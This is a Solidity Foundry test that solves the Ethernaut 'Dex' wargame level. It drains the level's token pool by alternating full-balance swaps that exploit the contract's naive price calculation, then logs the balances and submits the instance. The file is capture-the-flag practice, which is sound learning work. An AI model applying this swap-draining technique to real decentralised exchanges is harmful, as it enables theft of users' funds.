// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautDexTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F; 

    function testLevel22_Dex() public {

        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("DEX Address:", levelAddr);

        IDex dex = IDex(levelAddr);
        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());

        console.log("Hacker Start Balance T1:", t1.balanceOf(hacker));
        console.log("Hacker Start Balance T2:", t2.balanceOf(hacker));

        t1.approve(address(dex), type(uint256).max);
        t2.approve(address(dex), type(uint256).max);

        
        bool swapT1toT2 = true; 

        while (t1.balanceOf(levelAddr) > 0 && t2.balanceOf(levelAddr) > 0) {
            
            IERC20 tokenIn = swapT1toT2 ? t1 : t2;
            IERC20 tokenOut = swapT1toT2 ? t2 : t1;
            
            uint256 myBalance = tokenIn.balanceOf(hacker);
            
            uint256 dexBalance = tokenOut.balanceOf(levelAddr);

            uint256 swapAmount = dex.getSwapPrice(address(tokenIn), address(tokenOut), myBalance);

            if (swapAmount > dexBalance) {

                uint256 reserveIn = tokenIn.balanceOf(levelAddr);
                uint256 amountToSwap = dexBalance * reserveIn / tokenOut.balanceOf(levelAddr);
                
                dex.swap(address(tokenIn), address(tokenOut), amountToSwap);
                break; 
            } else {
                dex.swap(address(tokenIn), address(tokenOut), myBalance);
            }

            swapT1toT2 = !swapT1toT2; 
        }

        console.log("--- AFTER ATTACK ---");
        console.log("DEX Balance T1:", t1.balanceOf(levelAddr));
        console.log("DEX Balance T2:", t2.balanceOf(levelAddr));
        
        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}